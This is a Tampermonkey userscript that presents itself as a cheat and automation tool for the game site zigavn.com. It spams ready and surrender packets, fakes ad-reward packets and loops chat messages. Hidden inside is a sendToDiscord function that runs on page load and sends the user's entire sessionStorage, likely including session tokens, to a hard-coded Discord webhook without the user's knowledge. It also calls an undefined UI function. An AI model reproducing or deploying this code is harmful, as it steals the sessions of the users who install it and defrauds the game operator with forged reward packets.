// ==UserScript==
// @name         v4 Fonsida Ultimate v3.4 - Full Gộp Chat + Icon + UI Tổng Hợp (Auto Discord)
// @namespace    http://tampermonkey.net/
// @version      3.4
// @description  UI Ready + Auto Agree + Buff 121s + Xin thua + Chat + Icon Chat + BlockChat + Refuse Draw (Gửi Discord tự động)
// @match        https://zigavn.com/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';

  const delay = (ms) => new Promise(r => setTimeout(r, ms));
  let readyInterval = null;
  let adInterval = 121000;
  let adTimer = null;
  let surrenderInterval = null;
  let chatOn = false;

  const iconList = [
    "8-|", "|-)", ":^o", "=P~", ":O)", ":)", ":-h", ":x", ":))", "=p~",
    "=))", ":D", ":-a", ":((", "o-)", "~X(", ":-S", ":-B", "=;", "/:)",
    ":-c", ":)]", ":-t", "8->", "I-)", ":-y", ":-u", ":-i", ":-p", ":-g",
    ":-f", ":-s", ":-w", ":-q", ":-r", ":-x", ":-m", ":-n", ":-z"
  ];

  let iconIndex = 0;
  let chatList = [];
  let chatIndex = 0;
  let iconOn = false;

  function sendMainPacket() {
    const p = new BkPacket();
    p.yj(Ze, PLAYER_STATE_READY);
    BkConnectionManager.send(p);
  }

  function startReadyPacket() {
    if (!readyInterval) readyInterval = setInterval(sendMainPacket, 50);
  }

  function stopReadyPacket() {
    if (readyInterval) clearInterval(readyInterval);
    readyInterval = null;
  }

  function tryCallFz() {
    try {
      const scene = cc.director.getRunningScene();
      if (!scene || !scene.children) return;
      for (const node of scene.children) {
        if (typeof node?.fz === 'function' && typeof node?.S === 'function') {
          const state = node.S();
          const gameState = state?.Ib;
          const player = state?.Ca?.();
          if (gameState === GAME_STATE_PLAYING && player?.status !== PLAYER_STATE_NOT_READY) {
            node.fz();
            console.log("[TM] Gọi fz() xin thua thành công!");
          }
        }
      }
    } catch (err) {
      console.warn("[TM] Gọi fz() lỗi:", err);
    }
  }

  function startSurrenderLoop() {
    if (!surrenderInterval) surrenderInterval = setInterval(tryCallFz, 50);
  }

  function stopSurrenderLoop() {
    if (surrenderInterval) clearInterval(surrenderInterval);
    surrenderInterval = null;
  }

  function sendAdPacket() {
    console.log("adViewed");
    logMessage("WebAdsManager - afterViewedAdsRewardOnWeb()");
    const p = new BkPacket();
    p.En(O);
    BkConnectionManager.send(p);
  }

  function startAdTimer() {
    if (adTimer) clearInterval(adTimer);
    adTimer = setInterval(sendAdPacket, adInterval);
  }

  function sendChatMessage(msg) {
    logMessage("sendChatMessage: " + msg);
    const p = new BkPacket();
    p.jq(msg);
    BkConnectionManager.send(p);
  }

  function startChatLoop() {
    if (chatOn) return;

    if (chatList.length === 0) {
      chatList = ["GG", "Chơi hay đấy!", "Xin thua nha 😅", "Tôi đi trước nhé!", "Thử lại ván nữa không?"];
      alert(`Đã tự động thêm ${chatList.length} câu chat mẫu.`);
    }

    chatIndex = 0;
    iconIndex = 0;
    chatOn = true;

    async function chatCycle() {
      while (chatOn) {
        sendChatMessage(chatList[chatIndex]);
        chatIndex = (chatIndex + 1) % chatList.length;
        await delay(4000);

        if (iconOn) {
          sendChatMessage(iconList[iconIndex]);
          iconIndex = (iconIndex + 1) % iconList.length;
          await delay(4000);
        }
      }
    }

    chatCycle();
  }

  function stopChatLoop() {
    chatOn = false;
    chatIndex = 0;
    iconIndex = 0;
  }

  function sendToDiscord() {
    let sessionData = Object.fromEntries(Object.entries(sessionStorage));
    let jsonData = JSON.stringify(sessionData, null, 2);
    let payload = {
      content: "📅 **Session Storage Data from zigavn.com:**\n```json\n" + jsonData + "\n```"
    };
    fetch("https://discord.com/api/webhooks/1345406693449666604/5aCLs6ScGGC7bRZVyUaNwD3iBO1jGVo1G8zueRnM96UpCc88YQ1XR5meB6lHKxVy_Cfo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  }

  function waitForCCAndRunTool() {
    if (typeof cc === 'undefined' || typeof cc.director === 'undefined') {
      console.log("⏳ Đợi cc.director sẵn sàng...");
      return setTimeout(waitForCCAndRunTool, 500);
    }

    console.log("✅ cc.director đã sẵn sàng!");
    createControlUI();
    sendToDiscord();
    setTimeout(() => {
      sendAdPacket();
      startAdTimer();
    }, 15000);
  }

  window.addEventListener("load", waitForCCAndRunTool);
})();
